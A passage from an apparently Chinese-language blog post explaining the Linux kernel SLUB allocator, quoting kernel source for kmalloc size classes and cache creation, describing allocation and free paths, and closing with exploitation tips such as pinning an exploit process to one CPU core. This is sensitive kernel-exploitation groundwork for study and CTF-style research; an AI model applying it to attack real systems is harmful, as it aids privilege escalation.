class="number">32</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-64&quot;</span>,             <span class="number">64</span>&#125;,     &#123;<span class="string">&quot;kmalloc-128&quot;</span>,           <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-256&quot;</span>,           <span class="number">256</span>&#125;,     &#123;<span class="string">&quot;kmalloc-512&quot;</span>,           <span class="number">512</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1024&quot;</span>,         <span class="number">1024</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2048&quot;</span>,         <span class="number">2048</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4096&quot;</span>,         <span class="number">4096</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8192&quot;</span>,         <span class="number">8192</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16384&quot;</span>,       <span class="number">16384</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32768&quot;</span>,       <span class="number">32768</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-65536&quot;</span>,       <span class="number">65536</span>&#125;,     &#123;<span class="string">&quot;kmalloc-131072&quot;</span>,     <span class="number">131072</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-262144&quot;</span>,     <span class="number">262144</span>&#125;,     &#123;<span class="string">&quot;kmalloc-524288&quot;</span>,     <span class="number">524288</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1048576&quot;</span>,   <span class="number">1048576</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2097152&quot;</span>,   <span class="number">2097152</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4194304&quot;</span>,   <span class="number">4194304</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8388608&quot;</span>,   <span class="number">8388608</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16777216&quot;</span>, <span class="number">16777216</span>&#125;,     &#123;<span class="string">&quot;kmalloc-33554432&quot;</span>, <span class="number">33554432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-67108864&quot;</span>, <span class="number">67108864</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
这样内核调用 <code>kmalloc</code>
函数时就可以根据申请的内存大小找到对应的 <code>kmalloc-xx</code>
，然后在里面找可可用的内存块。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">kmalloc_index</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!size)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">        <span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">    <span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div> 创建默认的
<code>kmem_cache</code> 过程存在如下调用链： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x86_64_start_kernel()</span><br><span class="line">    x86_64_start_reservations()</span><br><span class="line">        start_kernel()</span><br><span class="line">            mm_init()</span><br><span class="line">                kmem_cache_init()</span><br><span class="line">                    create_kmalloc_caches()</span><br><span class="line">                        new_kmalloc_cache()</span><br></pre></td></tr></table></figure></div> 在
<code>new_kmalloc_cache</code> 中根据 <code>kmalloc_info</code>
的信息创建对应的 <code>kmalloc_cache</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init</span><br><span class="line"><span class="title function_">new_kmalloc_cache</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> type, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type == KMALLOC_RECLAIM) &#123;</span><br><span class="line">		flags |= SLAB_RECLAIM_ACCOUNT;</span><br><span class="line">		name = kmalloc_cache_name(<span class="string">&quot;kmalloc-rcl&quot;</span>,</span><br><span class="line">						kmalloc_info[idx].size);</span><br><span class="line">		BUG_ON(!name);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		name = kmalloc_info[idx].name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kmalloc_caches[type][idx] = create_kmalloc_cache(name,</span><br><span class="line">					kmalloc_info[idx].size, flags, <span class="number">0</span>,</span><br><span class="line">					kmalloc_info[idx].size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
这里可以看到默认创建的 <code>kmem_cache</code> 的地址被保存在
<code>kmalloc_caches</code> 因此可以通过该结构获得
<code>kmem_cache</code> 的地址，从而获取到重要调试信息，比如
<code>freelist</code> 在 <code>object</code> 中的偏移
<code>offset</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8bced970f845702c22749e86041eda02.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p><code>create_kmalloc_cache</code> 函数调用了核心函数
<code>create_boot_cache</code> ，之后 <code>list_add</code> 将创建的
<code>kmem_cache</code> 加入到 <code>slab_caches</code>
链表中。内核全局有一个 <code>slab_caches</code>
变量，它是一个链表，系统所有的 <code>kmem_cache</code>
都接在这个链表上。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> kmem_cache *__init <span class="title function_">create_kmalloc_cache</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> kmem_cache_zalloc(kmem_cache, GFP_NOWAIT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		panic(<span class="string">&quot;Out of memory when creating slab %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">	create_boot_cache(s, name, size, flags, useroffset, usersize);</span><br><span class="line">	list_add(&amp;s-&gt;<span class="built_in">list</span>, &amp;slab_caches);</span><br><span class="line">	memcg_link_cache(s);</span><br><span class="line">	s-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>create_boot_cache</code>
初始化了相关信息，之后调用 <code>__kmem_cache_create</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">create_boot_cache</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	s-&gt;name = name;</span><br><span class="line">	s-&gt;size = s-&gt;object_size = size;</span><br><span class="line">	s-&gt;align = calculate_alignment(flags, ARCH_KMALLOC_MINALIGN, size);</span><br><span class="line">	s-&gt;useroffset = useroffset;</span><br><span class="line">	s-&gt;usersize = usersize;</span><br><span class="line"></span><br><span class="line">	slab_init_memcg_params(s);</span><br><span class="line"></span><br><span class="line">	err = __kmem_cache_create(s, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		panic(<span class="string">&quot;Creation of kmalloc slab %s size=%u failed. Reason %d\n&quot;</span>,</span><br><span class="line">					name, size, err);</span><br><span class="line"></span><br><span class="line">	s-&gt;refcount = <span class="number">-1</span>;	<span class="comment">/* Exempt from merging for now */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>__kmem_cache_create</code> 调用了
<code>kmem_cache_open</code> 函数，该函数做了很多重要的初始化操作。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * calculate_sizes() determines the order and the distribution of data within</span></span><br><span class="line"><span class="comment"> * a slab object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">calculate_sizes</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">int</span> forced_order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = s-&gt;object_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Round up object size to the next word boundary. We can only</span></span><br><span class="line"><span class="comment">	 * place the free pointer at word boundaries and this determines</span></span><br><span class="line"><span class="comment">	 * the possible location of the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine if we can poison the object itself. If the user of</span></span><br><span class="line"><span class="comment">	 * the slab may touch the object after free or before allocation</span></span><br><span class="line"><span class="comment">	 * then we should never poison the object itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_POISON) &amp;&amp; !(flags &amp; SLAB_TYPESAFE_BY_RCU) &amp;&amp;</span><br><span class="line">			!s-&gt;ctor)</span><br><span class="line">		s-&gt;flags |= __OBJECT_POISON;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		s-&gt;flags &amp;= ~__OBJECT_POISON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are Redzoning then check if there is some space between the</span></span><br><span class="line"><span class="comment">	 * end of the object and the free pointer. If not then add an</span></span><br><span class="line"><span class="comment">	 * additional word to have some bytes to store Redzone information.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_RED_ZONE) &amp;&amp; size == s-&gt;object_size)</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * With that we have determined the number of bytes in actual use</span></span><br><span class="line"><span class="comment">	 * by the object. This is the potential offset to the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;inuse = size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((flags &amp; (SLAB_TYPESAFE_BY_RCU | SLAB_POISON)) ||</span><br><span class="line">		s-&gt;ctor)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Relocate free pointer after the object if it is not</span></span><br><span class="line"><span class="comment">		 * permitted to overwrite the first word of the object on</span></span><br><span class="line"><span class="comment">		 * kmem_cache_free.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This is the case if we do RCU, have a constructor or</span></span><br><span class="line"><span class="comment">		 * destructor or are poisoning the objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		s-&gt;offset = size;</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_STORE_USER)</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Need to store information about allocs and frees after</span></span><br><span class="line"><span class="comment">		 * the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> track);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	kasan_cache_create(s, &amp;size, &amp;s-&gt;flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Add some empty padding so that we can catch</span></span><br><span class="line"><span class="comment">		 * overwrites from earlier objects rather than let</span></span><br><span class="line"><span class="comment">		 * tracking information or the free pointer be</span></span><br><span class="line"><span class="comment">		 * corrupted if a user writes before the start</span></span><br><span class="line"><span class="comment">		 * of the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">		s-&gt;red_left_pad = <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">		s-&gt;red_left_pad = ALIGN(s-&gt;red_left_pad, s-&gt;align);</span><br><span class="line">		size += s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SLUB stores one object immediately after another beginning from</span></span><br><span class="line"><span class="comment">	 * offset 0. In order to align the objects we have to simply size</span></span><br><span class="line"><span class="comment">	 * each object to conform to the alignment.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, s-&gt;align);</span><br><span class="line">	s-&gt;size = size;</span><br><span class="line">	<span class="keyword">if</span> (forced_order &gt;= <span class="number">0</span>)</span><br><span class="line">		order = forced_order;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		order = calculate_order(size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (order)</span><br><span class="line">		s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">		s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;oo = oo_make(order, size);</span><br><span class="line">	s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line">	<span class="keyword">if</span> (oo_objects(s-&gt;oo) &gt; oo_objects(s-&gt;max))</span><br><span class="line">		s-&gt;max = s-&gt;oo;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> (disable_higher_order_debug) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Disable debugging flags that store metadata if the min slab</span></span><br><span class="line"><span class="comment">		 * order increased.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (get_order(s-&gt;size) &gt; get_order(s-&gt;object_size)) &#123;</span><br><span class="line">			s-&gt;flags &amp;= ~DEBUG_METADATA_FLAGS;</span><br><span class="line">			s-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">				<span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">	<span class="keyword">if</span> (system_has_cmpxchg_double() &amp;&amp; (s-&gt;flags &amp; SLAB_NO_CMPXCHG) == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* Enable fast mode */</span></span><br><span class="line">		s-&gt;flags |= __CMPXCHG_DOUBLE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The larger the object size is, the more pages we want on the partial</span></span><br><span class="line"><span class="comment">	 * list to avoid pounding the page allocator excessively.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	set_min_partial(s, ilog2(s-&gt;size) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	set_cpu_partial(s);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	s-&gt;remote_node_defrag_ratio = <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize the pre-computed randomized freelist if slab is up */</span></span><br><span class="line">	<span class="keyword">if</span> (slab_state &gt;= UP) &#123;</span><br><span class="line">		<span class="keyword">if</span> (init_cache_random_seq(s))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!init_kmem_cache_nodes(s))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alloc_kmem_cache_cpus(s))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	free_kmem_cache_nodes(s);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">		panic(<span class="string">&quot;Cannot create slab %s size=%u realsize=%u order=%u offset=%u flags=%lx\n&quot;</span>,</span><br><span class="line">		      s-&gt;name, s-&gt;size, s-&gt;size,</span><br><span class="line">		      oo_order(s-&gt;oo), s-&gt;offset, (<span class="type">unsigned</span> <span class="type">long</span>)flags);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="slub-分配">slub 分配</h4>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f7f490f6f668b542aab003ec27135ad2.png"
                      alt="2.png" 
                >
<figcaption aria-hidden="true">2.png</figcaption>
</figure>
<ul>
<li><p>kmem_cache
刚刚建立，还没有任何对象可供分配，此时只能从伙伴系统分配一个 slab
，如下图所示。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/244cd82a22db3cb5168651580d622465.png"
                     
alt="3.png" 
                ></p></li>
<li><p>如果正在使用的 slab 有 free
obj，那么就直接分配即可，这种是最简单快捷的。如下图所示。<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/df0e27a7cc01c0a1ab1b387409d7b8a4.png"
                     
alt="4.png" 
                ></p></li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj
可分配，此时 per cpu partial 链表中有可用 slab 用于分配，那么就会从 per
cpu partial 链表中取下一个 slab 用于分配 obj。如下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b2a9a9ff98bb492fa0cfef2dc1490f6.png"
                     
alt="5.png" 
                ></p></li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj
可分配，此时 per cpu partial 链表也为空，此时发现 per node partial
链表中有可用 slab 用于分配，那么就会从 per node partial 链表中取下一个
slab 用于分配 obj。如下图所示。<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e9439ea41be5d91a1bc8789c50e098ff.png"
                      alt="6.png" 
                > ####
slub 释放</p></li>
</ul>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/06ab07e03d42cc6bd7f1079a157d0c6f.png"
                      alt="7.png" 
                >
<figcaption aria-hidden="true">7.png</figcaption>
</figure>
<ul>
<li>假设下图左边的情况下释放 obj，如果满足 kmem_cache_node 的 nr_partial
大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8ee336b6de8e8263a5dfa2dad69c99dc.png"
                      alt="8.png" 
                ></li>
<li>假设下图左边的情况下释放 obj，如果不满足 kmem_cache_node 的
nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/11bad950de73843bef8e1716a85bdb0c.png"
                     
alt="9.png" 
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果满足 per cpu partial
管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial
成员的话的话，将 per cpu partial 链表管理的所有 slab 移动到 per node
partial 链表管理，释放情况如下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/583c765a6df44d6ffd56e4f506174318.png"
                      alt="10.png" 
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果不满足 per cpu partial
管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial
成员的话的话，释放情况如下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0dc462afb4eebcf420803eca2491f169.png"
                      alt="11.png" 
                > ####
内核堆利用与绑核 slub allocator 会优先从当前核心的
<code>kmem_cache_cpu</code> 中进行内存分配，在多核架构下存在多个
<code>kmem_cache_cpu</code>
，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp
进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object
的分配有可能会来自不同的 <code>kmem_cache_cpu</code>
，这使得利用模型变得复杂，也降低了漏洞利用的成功率。</li>
</ul>
<p>因此为了保证漏洞利用的稳定，<strong>我们需要将我们的进程绑定到特定的某个
CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了
<code>kmem_cache_node + kmem_cache_cpu</code>
，我们也能更加方便地进行漏洞利用</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
